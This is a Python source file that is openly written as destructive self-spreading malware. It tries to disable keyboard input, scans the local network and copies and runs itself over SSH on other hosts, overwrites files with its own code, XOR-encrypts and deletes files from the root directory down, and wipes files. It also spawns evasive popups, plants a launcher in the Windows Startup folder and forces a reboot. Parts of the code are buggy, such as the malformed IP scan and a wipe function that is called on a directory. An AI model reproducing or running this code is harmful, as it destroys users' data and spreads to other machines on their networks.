import os
import shutil
import random
import hashlib
import threading
import subprocess
import time
from pathlib import Path
import tkinter as tk
from tkinter import messagebox
from concurrent.futures import ThreadPoolExecutor
import pyautogui
import pynput
import paramiko
import socket

# Function to disable keyboard and mouse
def disable_input():
    # Disable mouse
    pyautogui.FAILSAFE = True

    # Disable keyboard
    class KeyboardListener(pynput.keyboard.Listener):
        def on_press(self, key):
            pass

    with pynput.keyboard.Controller() as controller:
        keyboard_listener = KeyboardListener()
        with keyboard_listener:
            keyboard_listener.start()

    print("Keyboard and mouse disabled.")

# Function to search for available networks
def search_networks():
    networks = subprocess.check_output(['netsh', 'wlan', 'show', 'networks']).decode('utf-8')
    print(f"Available Networks:\n{networks}")

# Function to copy running state to all devices
def copy_running_state():
    current_script_path = Path(__file__).resolve()
    with open(current_script_path, "r") as script_file:
        script_content = script_file.read()

    # Scan for devices on the local network
    def scan_network():
        host = socket.gethostname()
        local_ip = socket.gethostbyname(host)
        print(f"Local IP address: {local_ip}")

        # Scan for devices on the local network
        for ip in range(1, 255):
            try:
                remote_ip = f"{local_ip}.{ip}"
                socket.gethostbyaddr(remote_ip)
                print(f"Device found: {remote_ip}")
                copy_and_run_script(remote_ip)
            except socket.herror:
                pass

    def copy_and_run_script(remote_ip):
        # SSH configuration
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(remote_ip, username="your_username", password="your_password")
            sftp = ssh.open_sftp()
            remote_path = "/tmp/running_script.py"
            sftp.put(current_script_path, remote_path)
            sftp.close()

            # Run the script on the remote machine
            stdin, stdout, stderr = ssh.exec_command(f"python3 {remote_path}")
            print(stdout.read().decode())
            print(stderr.read().decode())
            ssh.close()
        except Exception as e:
            print(f"Error copying and running script on {remote_ip}: {e}")

    scan_network()

def replicate_current_script(directory):
    current_script_path = Path(__file__).resolve()
    with open(current_script_path, "r") as script_file:
        script_content = script_file.read()

    def replicate_file(file_path):
        try:
            with open(file_path, "w") as target_file:
                target_file.write(script_content)
            print(f"Replicated script content into: {file_path}")
        except Exception as e:
            print(f"Error replicating to {file_path}: {e}")

    with ThreadPoolExecutor() as executor:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                executor.submit(replicate_file, file_path)

def encrypt_files_in_directory(directory, key):
    def encrypt_file(file_path):
        encrypted_file = f"{file_path}.enc"
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = bytearray(b ^ key for b in data)
            with open(encrypted_file, "wb") as f:
                f.write(encrypted_data)
            os.remove(file_path)
            print(f"Encrypted: {file_path}")
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")

    with ThreadPoolExecutor() as executor:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                executor.submit(encrypt_file, file_path)

def hash_files_in_directory(directory):
    hash_results = []
    def hash_file(file_path):
        try:
            with open(file_path, "rb") as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
            hash_results.append((file_path, file_hash))
            print(f"Hashed {file_path}: {file_hash}")
        except Exception as e:
            print(f"Error hashing {file_path}: {e}")

    with ThreadPoolExecutor() as executor:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                executor.submit(hash_file, file_path)
    return hash_results

def propagate_recursively():
    user_home = str(Path.home())
    subdirs = [os.path.join(user_home, f"sub_{i}") for i in range(5)]
    for subdir in subdirs:
        try:
            os.makedirs(subdir, exist_ok=True)
            replicate_current_script(subdir)
        except Exception as e:
            print(f"Error creating subdir {subdir}: {e}")

def run_parallel_operations(directory):
    encryption_key = random.randint(1, 255)
    with ThreadPoolExecutor() as executor:
        futures = [
            executor.submit(encrypt_files_in_directory, directory, encryption_key),
            executor.submit(hash_files_in_directory, directory),
            executor.submit(wipe_file_securely, directory),
            executor.submit(show_corrupted_popups),
            executor.submit(search_networks),
            executor.submit(copy_running_state)
        ]
        for future in futures:
            try:
                future.result()
            except Exception as e:
                print(f"Error in parallel operation: {e}")

def show_corrupted_popups():
    def popup():
        root = tk.Tk()
        root.attributes("-topmost", True)
        root.overrideredirect(True)  # Remove window decorations
        root.geometry("300x100")

        label = tk.Label(root, text=generate_corrupted_text(), font=("Arial", 12))
        label.pack(expand=True, fill='both')

        def move_away(event):
            x = random.randint(0, root.winfo_screenwidth() - 300)
            y = random.randint(0, root.winfo_screenheight() - 100)
            root.geometry(f"300x100+{x}+{y}")

        root.bind("<Enter>", move_away)

        while True:
            root.update_idletasks()
            root.update()

    def generate_corrupted_text():
        return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()') for _ in range(50))

    popup()

def wipe_file_securely(filepath, passes=3):
    try:
        length = os.path.getsize(filepath)
        with open(filepath, "wb") as f:
            for _ in range(passes):
                f.write(os.urandom(length))
        os.remove(filepath)
        print(f"Securely wiped: {filepath}")
    except Exception as e:
        print(f"Error wiping {filepath}: {e}")

def copy_run_all_clones_to_startup():
    startup_folder = os.path.expanduser('~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
    os.makedirs(startup_folder, exist_ok=True)

    run_all_clones_path = os.path.join(startup_folder, 'run_all_clones.py')

    with open('run_all_clones.py', 'r') as file:
        run_all_clones_content = file.read()

    with open(run_all_clones_path, 'w') as file:
        file.write(run_all_clones_content)

    print(f"Copied run_all_clones.py to startup folder: {run_all_clones_path}")

def main():
    disable_input()
    try:
        while True:
            execute_sophisticated_operations()
    except Exception as e:
        print(f"Error in main loop: {e}")
    finally:
        # Restart the computer
        os.system("shutdown /r /t 0")

def execute_sophisticated_operations():
    print("Starting sophisticated operations...")

    print("Performing recursive propagation...")
    propagate_recursively()

    print("Executing parallel operations...")
    run_parallel_operations("/")  # Root directory for all files

    print("All operations completed.")

    # Copy the run_all_clones.py script to the startup folder
    copy_run_all_clones_to_startup()

# Content of run_all_clones.py
OHNOES = """
OOPS!
"""

run_all_clones_content = f"""
import os
from pathlib import Path

def run_all_clones():
    main_script_path = Path("/path/to/your/main_script.py")  # Replace with the path to your main script
    for root, dirs, files in os.walk(Path.home()):
        for file in files:
            if file == main_script_path.name:
                file_path = os.path.join(root, file)
                print(f"Running cloned script: {file_path}")
                subprocess.Popen(["python", file_path])

if __name__ == "__main__":
    run_all_clones()
"""

if __name__ == "__main__":
    print("Script initialized.")
    main()